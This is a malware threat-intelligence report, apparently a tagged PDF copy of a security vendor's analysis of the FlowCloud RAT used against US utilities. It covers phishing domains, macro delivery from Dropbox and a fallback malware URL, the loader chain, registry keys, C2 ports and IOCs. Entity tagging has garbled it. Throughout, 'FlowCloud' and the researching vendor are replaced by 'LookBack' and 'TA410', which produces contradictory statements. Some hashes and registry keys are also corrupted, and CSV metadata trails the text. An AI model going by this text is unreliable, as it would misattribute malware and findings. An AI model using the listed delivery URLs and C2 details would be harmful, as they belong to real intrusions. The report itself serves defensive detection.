<CAMPAIGN>LookBack</CAMPAIGN> campaigns. On <TIMESTAMP>October 29, 2019</TIMESTAMP>, the domain resolved to the IP
<IOC>134.209.99[.]169</IOC> which also hosted several energy certification and education themed
domains. A number of these domains also shared an SSL certificate with delivery domains



8/20/2020 (2) New Messages!

https://www.proofpoint.com/us/blog/threat-insight/ta410-group-behind-lookback-attacks-against-us-utilities-sector-returns-new 4/20

previously observed in the <TIMESTAMP>July and August 2019</TIMESTAMP><CAMPAIGN>LookBack</CAMPAIGN> phishing campaigns. The
data from this SSL Certificate has been displayed in Figure 2. This figure demonstrates
the actor’s use of a single SSL certificate for multiple energy and training themed
domains. The actor listed the domains that were signed by the certificate in the
Alternative Names field allowing for the identification of additional related infrastructure.
A number of these domains were used in<CAMPAIGN>LookBack</CAMPAIGN> campaigns.

Figure 2 Passive Total SSL Certificate data for powersafetrainings[.]org and related
energy themed domains.

The table below shows the<THREAT_ACTOR>TA410</THREAT_ACTOR> staging IPs, when they were first observed, the
registered domains associated with them, and the malware delivered by emails
originating from these domains.

IP First
Observed

Registered Domains Malware
Delivered



8/20/2020 (2) New Messages!

https://www.proofpoint.com/us/blog/threat-insight/ta410-group-behind-lookback-attacks-against-us-utilities-sector-returns-new 5/20

<IOC>103.253.41[.]75</IOC> 06/23/2019 Delivery Domain:

<IOC>Nceess[.]com</IOC>

<IOC>Globalenergycertification[.]com</IOC>

 

Registered Domain:

<IOC>Nerc[.]email</IOC>

<IOC>Asce[.]email</IOC>

<CAMPAIGN>LookBack</CAMPAIGN>

<IOC>134.209.99[.]169</IOC> 10/29/2019 Delivery Domain:

<IOC>Asce[.]email</IOC>

 

Registered Domain:

<IOC>Powersafetraining[.]net</IOC>

 

Domains Related by SSL Certificate:

<IOC>mails.energysemi[.]com</IOC>

<IOC>powersafetrainings[.]org</IOC>

<IOC>www.mails.energysemi[.]com</IOC>

<IOC>www.powersafetraining[.]net</IOC>
<IOC>www.powersafetrainings[.]org</IOC>

<CAMPAIGN>LookBack</CAMPAIGN>

<IOC>101.99.74[.]234</IOC> 07/02/2019 Delivery Domain

<IOC>www.powersafetrainings[.]org</IOC>

<CAMPAIGN>LookBack</CAMPAIGN>

The content of the emails in the <TIMESTAMP>November 2019</TIMESTAMP> campaigns impersonated the American
Society of Civil Engineers and masqueraded as the legitimate domain asce[.]org. The
structure of this email is very similar to the<CAMPAIGN>LookBack</CAMPAIGN> delivery emails constructed to
impersonate the NCEES and Global Energy Certification in <TIMESTAMP>July 2019</TIMESTAMP>. Examples of the
emails are included in Figure 3 and Figure 4.



8/20/2020 (2) New Messages!

https://www.proofpoint.com/us/blog/threat-insight/ta410-group-behind-lookback-attacks-against-us-utilities-sector-returns-new 6/20

Figure 3 ASCE-themed phishing email delivering<CAMPAIGN>LookBack</CAMPAIGN> malware <TIMESTAMP>November 2019</TIMESTAMP>



8/20/2020 (2) New Messages!

https://www.proofpoint.com/us/blog/threat-insight/ta410-group-behind-lookback-attacks-against-us-utilities-sector-returns-new 7/20

Figure 4 NCEES-themed phishing email delivering<CAMPAIGN>LookBack</CAMPAIGN> malware <TIMESTAMP>July 2019</TIMESTAMP>

Exploitation - Installation Macros

As noted above, after an extended period of using PE attachments to deliver<CAMPAIGN>LookBack</CAMPAIGN> in
campaigns, the threat actors behind<CAMPAIGN>LookBack</CAMPAIGN> switched to using Microsoft Word
documents with malicious macros at the beginning of <TIMESTAMP>November 2019</TIMESTAMP>. The Word
document attachments and macros delivering<CAMPAIGN>LookBack</CAMPAIGN> had key similarities with the
Word document attachments and macros we identified that delivered<CAMPAIGN>LookBack</CAMPAIGN> in <TIMESTAMP>July
and August 2019</TIMESTAMP>.

Identical to the methodology used with<CAMPAIGN>LookBack</CAMPAIGN>, the<CAMPAIGN>LookBack</CAMPAIGN> macro used privacy
enhanced mail (“.pem”)  files which were subsequently renamed to the text file
“pense1.txt”. This file is next saved as a portable executable file named “gup.exe” and
executed using a version of the certutil.exe tool named “Temptcm.tmp”.



8/20/2020 (2) New Messages!

https://www.proofpoint.com/us/blog/threat-insight/ta410-group-behind-lookback-attacks-against-us-utilities-sector-returns-new 8/20

For comparison, Figure 5 <TIMESTAMP>November 2019</TIMESTAMP> macro used to install<CAMPAIGN>LookBack</CAMPAIGN> malware
shows the macro used to install<CAMPAIGN>LookBack</CAMPAIGN> while Figure 6 <TIMESTAMP>August 2019</TIMESTAMP> macro used to
install<CAMPAIGN>LookBack</CAMPAIGN> malware shows the macro used to install<CAMPAIGN>LookBack</CAMPAIGN>.

Figure 5 <TIMESTAMP>November 2019</TIMESTAMP> macro used to install<CAMPAIGN>LookBack</CAMPAIGN> malware

Figure 6 <TIMESTAMP>August 2019</TIMESTAMP> macro used to install<CAMPAIGN>LookBack</CAMPAIGN> malware

The “Exploitation” section in our blog <CAMPAIGN>LookBack</CAMPAIGN> Malware Targets the <COUNTRY>United States</COUNTRY>
<INDUSTRY>Utilities Sector</INDUSTRY> with Phishing Attacks Impersonating Engineering Licensing Boards has a
more in-depth explanation of this method used by<CAMPAIGN>LookBack</CAMPAIGN>.<CAMPAIGN>LookBack</CAMPAIGN> uses this same
method exactly including identical macro concatenation code.

While we found the ultimate execution method for both the<CAMPAIGN>LookBack</CAMPAIGN> Gup proxy tool and
<CAMPAIGN>LookBack</CAMPAIGN> malware were the same across both macro versions, we found that the
<CAMPAIGN>LookBack</CAMPAIGN> macro introduced a new method for the delivery of the malware.

The earlier<CAMPAIGN>LookBack</CAMPAIGN> versions of the macro included the payload in numerous privacy
enhanced email (“.pem”) files that were dropped when the attachment file is executed by
the user. The<CAMPAIGN>LookBack</CAMPAIGN> version of the macro utilized a previously unobserved macro
section to download the payload from a DropBox URL. Once the payload was

https://www.proofpoint.com/us/threat-insight/post/lookback-malware-targets-united-states-utilities-sector-phishing-attacks


8/20/2020 (2) New Messages!

https://www.proofpoint.com/us/blog/threat-insight/ta410-group-behind-lookback-attacks-against-us-utilities-sector-returns-new 9/20

downloaded, a<CAMPAIGN>LookBack</CAMPAIGN> malware PE in the form of a .pem file was saved as the variable
“Pense1.txt”. Figure 7<CAMPAIGN>LookBack</CAMPAIGN> Malware Macro delivery code shows the<CAMPAIGN>LookBack</CAMPAIGN>
macro with the delivery section in question called out.

Figure 7<CAMPAIGN>LookBack</CAMPAIGN> Malware Macro delivery code

The<CAMPAIGN>LookBack</CAMPAIGN> macro also contained a strange try… catch statement which initially
attempts to download the<CAMPAIGN>LookBack</CAMPAIGN> payload from the DropBox URL as part of the try
statement. However, if it was unable to retrieve the payload from that resource, a catch
statement which was nearly identical to the try statement attempted to retrieve a malware
resource from the URL <IOC>http://ffca.caibi379[.]com/rwjh/qtinfo.txt</IOC>”.”. Figure 8<CAMPAIGN>LookBack</CAMPAIGN>
Malware Catch statement macro code shows the catch statement in question.

Figure 8<CAMPAIGN>LookBack</CAMPAIGN> Malware Catch statement macro code

This try…catch sequence is significant because the URL in the catch statement and
malware resource was previously mentioned in a May 2019 blog by<ORG>EnSilo</ORG> entitled
“Uncovering New Activity by <THREAT_ACTOR>APT10</THREAT_ACTOR>”. The blog claims that this URL delivered a modified
<MALWARE>Quasar RAT</MALWARE> payload which included the addition of <TOOL>SharpSploit</TOOL>, an opensource post-
exploitation tool. When analyzed on the same date of<CAMPAIGN>LookBack</CAMPAIGN> campaign delivery this
URL and resource was unavailable, while the DropBox URL successfully delivered the
<CAMPAIGN>LookBack</CAMPAIGN> .pem file. While<ORG>TA410</ORG> has not independently verified these attribution
claims made by other researchers regarding the referenced <MALWARE>Quasar RAT</MALWARE> sample, the use
of this URL represents a previously undisclosed overlap with publicly reported indicators
of compromise attributed to<THREAT_ACTOR>TA429</THREAT_ACTOR> (<THREAT_ACTOR>APT10</THREAT_ACTOR>). While on the surface this domain may imply
links to<THREAT_ACTOR>TA429</THREAT_ACTOR> (<THREAT_ACTOR>APT10</THREAT_ACTOR>), we have identified several aberrations regarding the domain
registration information and inactive nature of the URL and will discuss them at length at
length later in this blog.

https://blog.ensilo.com/uncovering-new-activity-by-<THREAT_ACTOR>APT10</THREAT_ACTOR>


8/20/2020 (2) New Messages!

https://www.proofpoint.com/us/blog/threat-insight/ta410-group-behind-lookback-attacks-against-us-utilities-sector-returns-new 10/20

<CAMPAIGN>LookBack</CAMPAIGN> Malware

Our analysis of the<CAMPAIGN>LookBack</CAMPAIGN> malware determined that it is a multi-stage payload
comprised of a large code base written in C++. The code demonstrates a level of
complexity including numerous components, extensive object-oriented programming,
and use of legitimate and imitation QQ files for initial and later stage execution. We found
further imitation of QQ components in several modules used throughout<CAMPAIGN>LookBack</CAMPAIGN>
execution. The malware name “<CAMPAIGN>FlowCloud</CAMPAIGN>” was taken from distinctive PDB paths
observed in numerous malware components. These values have been included in the IOCs
section at the end of this blog.

<CAMPAIGN>LookBack</CAMPAIGN> malware is capable of RAT functionalities based on its available commands
including accessing the clipboard, installed applications, keyboard, mouse, screen, files,
services, and processes with the ability to exfiltrate information via command and
control. Additionally, the malware variants analyzed have several distinct characteristics
that indicate the malware may have been active in the threat landscape since at least <TIMESTAMP>July
2016</TIMESTAMP>.

In addition to components built to target updated <SOFTWARE>Windows</SOFTWARE> versions,<CAMPAIGN>LookBack</CAMPAIGN> samples
have dropped a 32-bit module that was only compatible with <SOFTWARE>Windows</SOFTWARE> versions 6
(<SOFTWARE>Windows Vista</SOFTWARE>) and below. The dated nature of this binary coupled with the extensible
nature of the malware code suggests that the<CAMPAIGN>LookBack</CAMPAIGN> code base has been under
development for numerous years. Public reports around<CAMPAIGN>LookBack</CAMPAIGN> malware components
and related installation directory paths suggest that versions of this malware may have
been observed in the wild as early as <TIMESTAMP>July 2016</TIMESTAMP>. Additionally, development of this
malware around legitimate QQ files and the identification of malware samples uploaded
to <SOFTWARE>VirusTotal</SOFTWARE> from <COUNTRY>Japan</COUNTRY> in <TIMESTAMP>December 2018</TIMESTAMP> and earlier this year from <COUNTRY>Taiwan</COUNTRY> indicate
that the malware may have been active for some time in Asia prior to its appearance
targeting the <COUNTRY>US</COUNTRY> <INDUSTRY>utilities sector</INDUSTRY>.

Figure 9 Flowchart of<CAMPAIGN>LookBack</CAMPAIGN> Loader Functionality below outlines <CAMPAIGN>FlowCloud</CAMPAIGN>’s loader
functionality.

https://www.bleepingcomputer.com/forums/t/644821/computer-restart-every-1-2-minutes-and-bsod/


8/20/2020 (2) New Messages!

https://www.proofpoint.com/us/blog/threat-insight/ta410-group-behind-lookback-attacks-against-us-utilities-sector-returns-new 11/20

Figure 9 Flowchart of<CAMPAIGN>LookBack</CAMPAIGN> Loader Functionality

The malware begins with the execution of <IOC>Gup.exe</IOC> by the malicious macro which in
turn executes the file <IOC>EhStorAuthn.exe</IOC>.



8/20/2020 (2) New Messages!

https://www.proofpoint.com/us/blog/threat-insight/ta410-group-behind-lookback-attacks-against-us-utilities-sector-returns-new 12/20

<IOC>EhStorAuthn.exe</IOC> extracts the subsequent payload file components and installs them
to the directory <IOC>C:\Windows\Media\SystemPCAXD\ado\fc</IOC>. This file also sets
registry key values that store the keylogger drivers and the malware configuration as
the value “<IOC>KEY_LOCAL_MACHINE\SYSTEM\Setup\PrintResponsor\<2-4></IOC>”.
<IOC>EhStorAuthn.exe</IOC> is a legitimate portable executable file used by QQ with the initial
name <IOC>QQSetupEx.exe</IOC>. This file is used to load the file <IOC>dlcore.dll</IOC> as part of its natural
downloader routine.
<IOC>Dlcore.dll</IOC> is a DLL crafted by the threat actors that functions as a shellcode injector
pulling the shellcode from a file named <IOC>rebare.dat</IOC>. This file imitates a legitimate QQ
component.
 When the shellcode within rebare.dat is executed it in turn executes a RAT installer
file named <IOC>rescure.dat</IOC>.
 <IOC>Rescure.dat</IOC> is an XOR encrypted DLL file that installs the RAT based application
<IOC>responsor.dat</IOC> which installs the keylogger driver and manages the RAT
functionality.
<IOC>Responsor.dat</IOC> unpacks several modules (<IOC>rescure86.dat</IOC> or <IOC>rescure64.dat</IOC>) to the
registry <IOC>%TEMP%\{0d47c9bc-7b04-4d81-9ad8-b2e00681de8e}</IOC>"" and installs the
unpacked file as a service named “FSFilter Activity Monitor” or “FltMgr”.
Finally, <IOC>Responsor.dat</IOC> starts the RAT when the <IOC>rescure.dat</IOC> function “startModule”
is called.
Several legitimate <SOFTWARE>Microsoft Windows</SOFTWARE> files were also used by the malware for
thread injection.
<IOC>EhStorAuthn_shadow.exe</IOC> (<IOC>hhw.exe</IOC>) a Microsoft HTML Help Workshop file was
used as a placeholder for thread injection.
<IOC>Hha.dll</IOC> is a component of Microsoft HTML Help Workshop and is required to run
<IOC>EhStorAuthn_shadow.exe</IOC>.

The malware stores its configuration in the registry alongside drivers utilized by the
malware’s keylogger components. Several additional distinct registry keys are generated
which indicate the malware’s current execution stage on the host. Some of these keys are
included in the table below.

Registry Key Originating
Component

Description

<IOC>HKEY_LOCAL_MACHINE\SYSTEM\Setup\Print
Responsor\2</IOC>

<IOC>Gup.exe</IOC> 32bit Driver,
Keylogger

<IOC>HKEY_LOCAL_MACHINE\SYSTEM\Setup\Print
Responsor\3</IOC>

<IOC>Gup.exe</IOC> 64bit Driver,
Keylogger

<IOC>HKEY_LOCAL_MACHINE\SYSTEM\Setup\Print
Responsor\4</IOC>

<IOC>Gup.exe</IOC> RAT config



8/20/2020 (2) New Messages!

https://www.proofpoint.com/us/blog/threat-insight/ta410-group-behind-lookback-attacks-against-us-utilities-sector-returns-new 13/20

<IOC>HKEY_LOCAL_MACHINE\HARDWARE\{2D-
B80286-1784-48b5-A751-B6ED1F490303}</IOC>

<IOC>Dlcore.dll</IOC> Execution Stage Ex-
ecuting <IOC>dlcore.dll</IOC>

<IOC>HKEY_LOCAL_MACHINE\HARDWARE\
{804423C2-F490-4ac3-BFA5-13DEDE63A71A}</IOC>

<IOC>rescure.dat</IOC> Execution Stage In-
stall keylogger driver

<IOC>HKEY_LOCAL_MACHINE\HARDWARE\
{A5124AF5-DF23-49bf-B0ED-A18ED3DEA027}</IOC>

<IOC>rescure.dat</IOC> Execution Stage 

RAT fully installed.

<CAMPAIGN>LookBack</CAMPAIGN> Configuration

The<CAMPAIGN>LookBack</CAMPAIGN> loader component <IOC>EhStorAuthn.exe</IOC> stores the malware configuration in
the registry early in the installation chain and is represented in the table above. The
Registry data is composed of multiple encrypted headers (using XORs and RORs) and
data is encrypted using a modified (or broken) AES algorithm. The plaintext data is
compressed with ZLIB and serialized using Google’s Protocol Buffers.  Figure 10 shows an
example of a configuration as displayed by FlowCloud’s debug logging:

Figure 10 Example of a configuration as displayed by debug logging



8/20/2020 (2) New Messages!

https://www.proofpoint.com/us/blog/threat-insight/ta410-group-behind-lookback-attacks-against-us-utilities-sector-returns-new 14/20

Command and Control

<CAMPAIGN>LookBack</CAMPAIGN> malware handles configuration updates, file exfiltration, and commands as
independent threads utilizing a custom binary C2 protocol. We identified these
independent threads as part of an extensive command handling functionality with
distinct command managers existing for each command. The sample we analyzed utilized
port 55555 for file exfiltration and port 55556 for all other data. We identified<CAMPAIGN>LookBack</CAMPAIGN>
communication with the IP <IOC>188.131.233[.]27</IOC>. The requests and responses are composed
of multiple encrypted headers (using XORs and RORs) and TEA encrypted data using a
key generation scheme involving a hardcoded string of random characters and MD5
hashing. The plaintext data is compressed using ZLIB and serialized using Google’s
Protocol Buffers. An example parsing of an initial beacon is demonstrated in Figure 11
Example of<CAMPAIGN>LookBack</CAMPAIGN> parsing an initial C2 beacon:



8/20/2020 (2) New Messages!

https://www.proofpoint.com/us/blog/threat-insight/ta410-group-behind-lookback-attacks-against-us-utilities-sector-returns-new 15/20

Figure 11 Example of<CAMPAIGN>LookBack</CAMPAIGN> parsing an initial C2 beacon

Comparing Public<THREAT_ACTOR>TA429</THREAT_ACTOR> (<THREAT_ACTOR>APT10</THREAT_ACTOR>) Indicators with<THREAT_ACTOR>TA410</THREAT_ACTOR> Campaigns



8/20/2020 (2) New Messages!

https://www.proofpoint.com/us/blog/threat-insight/ta410-group-behind-lookback-attacks-against-us-utilities-sector-returns-new 16/20

Publications by<ORG>FireEye</ORG> and<ORG>EnSilo</ORG> regarding<THREAT_ACTOR>TA429</THREAT_ACTOR> (<THREAT_ACTOR>APT10</THREAT_ACTOR>) campaigns contain
indicators that later appeared in<THREAT_ACTOR>TA410</THREAT_ACTOR> campaigns. In our retrospective analysis of that
research, we determined that<THREAT_ACTOR>TA429</THREAT_ACTOR> (<THREAT_ACTOR>APT10</THREAT_ACTOR>) used phishing macros that were later seen
being used by<CAMPAIGN>LookBack</CAMPAIGN> and<CAMPAIGN>LookBack</CAMPAIGN> malware. Additionally, we identified the Quasar
RAT delivery URL <IOC>hxxp://ffca.caibi379[.]com/rwjh/qtinfo.txt</IOC> used by<CAMPAIGN>LookBack</CAMPAIGN> macros
in November, which was published in the<ORG>EnSilo</ORG> report prior to observable weaponization
for<THREAT_ACTOR>TA410</THREAT_ACTOR> campaigns.

Interestingly, the compilation date of several<CAMPAIGN>LookBack</CAMPAIGN> malware modules used in <TIMESTAMP>July
2019</TIMESTAMP> were <TIMESTAMP>September 14, 2018</TIMESTAMP>. This includes the SodomMain and SodomNormal
modules covered in previous<ORG>TA410</ORG> blogs on<CAMPAIGN>LookBack</CAMPAIGN> malware. That date is just one
day after<ORG>FireEye</ORG> released their initial analysis of similar<THREAT_ACTOR>TA429</THREAT_ACTOR> (<THREAT_ACTOR>APT10</THREAT_ACTOR>) macros utilized
in <COUNTRY>Japan</COUNTRY> on <TIMESTAMP>September 13, 2018</TIMESTAMP>.

While<CAMPAIGN>LookBack</CAMPAIGN> malware samples were not observed in the wild until <TIMESTAMP>June 2019</TIMESTAMP>, this
<TIMESTAMP>September 2018</TIMESTAMP> compilation date demonstrates a large lag time between compilation and
delivery. This possibly suggests manipulation of compilation times by threat actors but
has not been conclusively determined.

The first identified server installation by<THREAT_ACTOR>TA410</THREAT_ACTOR> on actor-controlled infrastructure
occurred in December 2018. Most of the domain registration (weaponization) for
<CAMPAIGN>LookBack</CAMPAIGN> and<CAMPAIGN>LookBack</CAMPAIGN> campaigns began in May and June 2019 respectively. These
events were after FireEye’s initial publication in <TIMESTAMP>September 2018</TIMESTAMP>.

Additionally, enSilo’s publication on potentially<THREAT_ACTOR>TA429</THREAT_ACTOR> (<THREAT_ACTOR>APT10</THREAT_ACTOR>) related <MALWARE>Quasar RAT</MALWARE>
samples was published on <TIMESTAMP>May 24, 2019</TIMESTAMP>. It was not until the second week of <TIMESTAMP>November
2019</TIMESTAMP> when the inactive URL was incorporated into a phishing macro as part of a
<CAMPAIGN>LookBack</CAMPAIGN> campaign targeting <COUNTRY>US</COUNTRY> utilities. WHOIS records and passive DNS information
for <IOC>ffca.caibi379[.]com</IOC> indicate that the registrant email and address fields for the
domain were updated on <TIMESTAMP>June 7, 2019</TIMESTAMP>. The A record for the domain was updated on
<TIMESTAMP>September 9, 2019</TIMESTAMP> at which time it resolved to the IP <IOC>34.80.27[.]200</IOC> contained within an
ASN owned by Google. For the prior eight months beginning on January 2, 2019 and
encompassing the period of activity discussed by<ORG>EnSilo</ORG>, the domain was hosted on
several IP’s in an ASN owned by <ORG>APNIC</ORG> Hostmaster. The shift away from IP
infrastructure owned by <ORG>APNIC</ORG> represents a departure in threat actor infrastructure
hosting tactics well after the publication by<ORG>EnSilo</ORG> and within the weaponization period
for TA410’s campaign targeting <COUNTRY>US</COUNTRY> utilities. While this research is not conclusive, it
demonstrates that all observed<THREAT_ACTOR>TA429</THREAT_ACTOR> (<THREAT_ACTOR>APT10</THREAT_ACTOR>) similarities and indicators of compromise
were available publicly prior to the start of<THREAT_ACTOR>TA410</THREAT_ACTOR> campaigns. Therefore, while not
conclusive from current analysis, the possibility remains that these overlaps represent
false flag activity by the<THREAT_ACTOR>TA410</THREAT_ACTOR> threat actor. Based on this analysis<ORG>TA410</ORG> analysts
track<THREAT_ACTOR>TA410</THREAT_ACTOR> as a distinct threat actor from<THREAT_ACTOR>TA429</THREAT_ACTOR> (<THREAT_ACTOR>APT10</THREAT_ACTOR>) at this time.

Conclusion

https://www.fireeye.com/blog/threat-research/2018/09/APT10-targeting-japanese-corporations-using-updated-ttps.html


8/20/2020 (2) New Messages!

https://www.proofpoint.com/us/blog/threat-insight/ta410-group-behind-lookback-attacks-against-us-utilities-sector-returns-new 17/20

The convergence of<CAMPAIGN>LookBack</CAMPAIGN> and<CAMPAIGN>LookBack</CAMPAIGN> malware campaigns in <TIMESTAMP>November 2019</TIMESTAMP>
demonstrates the capabilities of<THREAT_ACTOR>TA410</THREAT_ACTOR> actors to distinctly utilize multiple tools as part of
a single ongoing campaign against US utilities providers. Both malware families
demonstrate a level of sophistication in their conception and development while the
extensible code base of<CAMPAIGN>LookBack</CAMPAIGN> malware suggests that this group may have been
operating <TIMESTAMP>as early as 2016</TIMESTAMP>.<THREAT_ACTOR>TA410</THREAT_ACTOR> operators demonstrate a willingness to dynamically
evolve phishing tactics to increase the effectiveness of their campaigns and a keen eye
towards plausible social engineering within a very select targeted sector. It remains
unclear if the nature of the tactics and indicators that are shared with<THREAT_ACTOR>TA429</THREAT_ACTOR> (<THREAT_ACTOR>APT10</THREAT_ACTOR>)
were developed by this group or culled from readily available technical reporting that pre-
dated these campaigns. The possibility remains that these overlaps represent intentional
false flag efforts to cloak the identity of these perpetrators while they targeted a critical
and geo-politically sensitive sector of energy providers in the <COUNTRY>US</COUNTRY>. Regardless of the actor’s
intention,<THREAT_ACTOR>TA410</THREAT_ACTOR> has established itself as a motivated actor with mature toolsets carrying
out long term campaigns against highly important and geographically concentrated target
sets.

Indicators of Compromise (IOCs)

IOC IOC
Type

<IOC>faa80e0692ba120e38924ccd46f6be3c25b8edf7cddaa8960fe9ea632dc4a045</IOC> SHA256

<IOC>b7960d1f40b727bbea18a0e5c62bafcb54c9ec73be3e69e787b7ddafd2aae364</IOC> SHA256

<IOC>26eb8a1f0bdde626601d039ea0f2c92a7921152371bafe5e811c6a1831f071ce</IOC> SHA256

<IOC>cd8f877c9a1c31179b633fd74bd5050e4d48eda29244230348c6f84878d0c33c</IOC> SHA256

<IOC>e4ad5d3213425c58778d8a0244df4cd99c748f58852d8ac71b46326efd5b3220</IOC> SHA256

<IOC>589229e2bd93100049909edf9825dce24ff963a0c465d969027db34e2eb878b4</IOC>

SHA256

1334 742f2 7 8412d76b 228b99935 49d SHA256



8/20/2020 (2) New Messages!

https://www.proofpoint.com/us/blog/threat-insight/ta410-group-behind-lookback-attacks-against-us-utilities-sector-returns-new 18/20

<IOC>1334c742f2aec7e8412d76ba228b99935a49dc96a1e8e1f3446d9f61247ae47e</IOC>

SHA256

<IOC>de30929ef958211f9315e27a7aa45ef061726a76990ddc6b9d9f189b9fbdd45a</IOC> SHA256

<IOC>0b013ccd9e10d7589994629aed18ffe2388cbd745b5b28ab39c07835295a1ca9</IOC>

SHA256

<IOC>479954b9e7d5c5f7086a2a1ff1dba99de2eab2e1b1bc75ad8f3b211088eb4ee9</IOC> SHA256

<IOC>d5191327a984fab990bfb0e811688e65e9aaa751c3d93-
fa92487e8a95cb2eea8</IOC>

SHA256

<IOC>0701cc7eb1af616294e90cbb35c99fa2b29d2aada9fcbdcdaf578b3fcf9b56c7</IOC> SHA256

<IOC>27f5df1d35744cf283702fce384ce8cfb2f240bae5d725335ca1b90d6128bd40</IOC> SHA256

<IOC>13e761f459c87c921dfb985cbc6489060eb86b4200c4dd99692d6936de8df5ba</IOC> SHA256

<IOC>2481fd08abac0bfefe8d8b1fa3beb70f8f9424a1601aa08e195c0c14e1547c27</IOC> SHA256

<IOC>188.131.233[.]27</IOC> IP

<IOC>118.25.97[.]43</IOC> IP

<IOC>34.80.27[.]200</IOC> IP

<IOC>134.209.99[.]169</IOC> IP

<IOC>101.99.74[.]234</IOC> IP

<IOC>Asce[.]email</IOC> Domain

<IOC>powersafetrainings[.]org</IOC> Domain



8/20/2020 (2) New Messages!

https://www.proofpoint.com/us/blog/threat-insight/ta410-group-behind-lookback-attacks-against-us-utilities-sector-returns-new 19/20

<IOC>mails.daveengineer[.]com</IOC> Domain

<IOC>powersafetraining[.]net</IOC> Domain

<IOC>mails.energysemi[.]com</IOC> Domain

<IOC>www.mails.energysemi[.]com</IOC> Domain

<IOC>www.powersafetraining[.]net</IOC> Domain

<IOC>www.powersafetrainings[.]org</IOC> Domain

<IOC>ffca.caibi379[.]com</IOC> Domain

<IOC>http://ffca.caibi379[.]com/rwjh/qtinfo.txt</IOC> URL

<IOC>https://www.dropbox[.]com:443/s/ddgifm4ityqwx60/Cert.pem?dl=1</IOC> URL

<IOC>HKEY_LOCAL_MACHINE\SYSTEM\Setup\PrintResponsor\2</IOC> Registry
Key

<IOC>HKEY_LOCAL_MACHINE\SYSTEM\Setup\PrintResponsor\3</IOC> Registry
Key

<IOC>HKEY_LOCAL_MACHINE\SYSTEM\Setup\PrintResponsor\4</IOC> Registry
Key

<IOC>HKEY_LOCAL_MACHINE\HARDWARE\{2DB80286-1784-48b5-A751-
B6ED1F490303}</IOC>

Registry
Key

<IOC>HKEY_LOCAL_MACHINE\HARDWARE\{804423C2-F490-4ac3-BFA5-
13DEDE63A71A}</IOC>

Registry
Key

<IOC>HKEY LOCAL MACHINE\HARDWARE\{A5124AF5 DF23 49bf B0ED R i t</IOC>



8/20/2020 (2) New Messages!

https://www.proofpoint.com/us/blog/threat-insight/ta410-group-behind-lookback-attacks-against-us-utilities-sector-returns-new 20/20

ET and ETPRO Suricata/SNORT Signatures

2837783 ETPRO TROJAN <MALWARE>Win32/LookBack</MALWARE> CnC Activity

© 2020. All rights reserved. Terms and conditions Privacy Policy Sitemap

 

<IOC>HKEY_LOCAL_MACHINE\HARDWARE\{A5124AF5-DF23-49bf-B0ED-
A18ED3DEA027}</IOC>

Registry
Key

<IOC>G:\FlowCloud\trunk\Dev\src\fcClient\Release\QQSetupEx_func.pdb</IOC> File
Path

<IOC>g:\FlowCloud\trunk\Dev\src\fcClient\Release\fcClientDll.pdb</IOC> File
Path

<IOC>F:\FlowCloud\trunk\Dev\src\fcClient\kmspy\Driver\Release\Driver.pdb</IOC> File
Path

<IOC>F:\FlowCloud\trunk\Dev\src\fcClient\kmspy\Driver\x64\Release\Driver.pdb</IOC> File
Path

https://www.proofpoint.com/us/license
https://www.proofpoint.com/us/privacy-policy
https://www.proofpoint.com/us/sitemap.xml",TA410;APT10;TA429,Windows;Windows Vista;VirusTotal;Microsoft Windows,Utilities Sector;utilities sector,TA410;EnSilo;FireEye;APNIC,"November 2019;August 2019;July and August 2019;June 2019;July 2019;September 2018;June 5, 2020;June 08, 2020;August 21-29,
2019;July-November 2019;July 10, 2019;September 2019;October 29, 2019;July
and August 2019;July
2016;July 2016;December 2018;July
2019;September 14, 2018;September 13, 2018;May 24, 2019;November
2019;June 7, 2019;September 9, 2019;as early as 2016",Quasar RAT;Win32/LookBack,U.S.;US;United States;Japan;Taiwan,"Gup.exe;EhStorAuthn.exe;rescure.dat;134.209.99[.]169;Asce[.]email;www.powersafetrainings[.]org;103.253.41[.]75;mails.energysemi[.]com;powersafetrainings[.]org;www.mails.energysemi[.]com;www.powersafetraining[.]net;101.99.74[.]234;http://ffca.caibi379[.]com/rwjh/qtinfo.txt;dlcore.dll;Dlcore.dll;Responsor.dat;EhStorAuthn_shadow.exe;188.131.233[.]27;ffca.caibi379[.]com;34.80.27[.]200;asce[.]email;Nceess[.]com;Globalenergycertification[.]com;Nerc[.]email;Powersafetraining[.]net;C:\Windows\Media\SystemPCAXD\ado\fc;KEY_LOCAL_MACHINE\SYSTEM\Setup\PrintResponsor\<2-4>;QQSetupEx.exe;rebare.dat;Rescure.dat;responsor.dat;rescure86.dat;rescure64.dat;%TEMP%\{0d47c9bc-7b04-4d81-9ad8-b2e00681de8e};hhw.exe;Hha.dll;HKEY_LOCAL_MACHINE\SYSTEM\Setup\Print
Responsor\2;HKEY_LOCAL_MACHINE\SYSTEM\Setup\Print
Responsor\3;HKEY_LOCAL_MACHINE\SYSTEM\Setup\Print
Responsor\4;HKEY_LOCAL_MACHINE\HARDWARE\{2D-
B80286-1784-48b5-A751-B6ED1F490303};HKEY_LOCAL_MACHINE\HARDWARE\
{804423C2-F490-4ac3-BFA5-13DEDE63A71A};HKEY_LOCAL_MACHINE\HARDWARE\
{A5124AF5-DF23-49bf-B0ED-A18ED3DEA027};hxxp://ffca.caibi379[.]com/rwjh/qtinfo.txt;faa80e0692ba120e38924ccd46f6be3c25b8edf7cddaa8960fe9ea632dc4a045;b7960d1f40b727bbea18a0e5c62bafcb54c9ec73be3e69e787b7ddafd2aae364;26eb8a1f0bdde626601d039ea0f2c92a7921152371bafe5e811c6a1831f071ce;cd8f877c9a1c31179b633fd74bd5050e4d48eda29244230348c6f84878d0c33c;e4ad5d3213425c58778d8a0244df4cd99c748f58852d8ac71b46326efd5b3220;589229e2bd93100049909edf9825dce24ff963a0c465d969027db34e2eb878b4;1334c742f2aec7e8412d76ba228b99935a49dc96a1e8e1f3446d9f61247ae47e;de30929ef958211f9315e27a7aa45ef061726a76990ddc6b9d9f189b9fbdd45a;0b013ccd9e10d7589994629aed18ffe2388cbd745b5b28ab39c07835295a1ca9;479954b9e7d5c5f7086a2a1ff1dba99de2eab2e1b1bc75ad8f3b211088eb4ee9;d5191327a984fab990bfb0e811688e65e9aaa751c3d93-
